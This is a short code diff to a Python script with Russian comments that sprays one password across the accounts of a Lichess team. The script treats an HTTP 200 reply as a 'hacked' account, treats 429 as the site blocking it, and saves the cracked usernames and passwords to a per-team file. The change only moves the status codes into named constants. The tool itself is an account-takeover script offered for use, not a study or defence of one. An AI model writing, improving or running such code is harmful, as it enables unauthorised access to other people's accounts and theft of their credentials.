@@ -12,7 +12,7 @@ def start(password, team):
     # Выводим сообщение, что список готов
     print(green + f"[+] Список пользователей получен!")
     print(
-        cyan + "[TIP] Запрос 200 означает, что акк взломан. 401 - не получилось. 429 - личесс заблокировал запрос(рекомендуется выключить программу)") # вывод подсказкм
+        cyan + f"[TIP] Запрос {str(OK_RESPONSE)} означает, что акк взломан. {str(ERROR_RESPONSE)} - не получилось. {str(BLOCKED_RESPONSE)} - личесс заблокировал запрос(рекомендуется выключить программу)") # вывод подсказкм
     #
     print(green + f"Взломанные аккаунты будут сохранены в файл hacked_checking/{team}.txt") # вывод о том куда будут сохранятся взломанные акки
 
@@ -33,7 +33,7 @@ def start(password, team):
         print(cyan + f"{get_ts()} {r}, {username}: {password}")
         k += 1
 
-        if str(r) == "<Response [200]>":
+        if str(r) == f"<Response [{OK_RESPONSE}]>":
             with open(f"hacked_checking/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем в файл взломанные акки
                 h_list.write(f"{get_ts()} {username}: {password} \n")
 
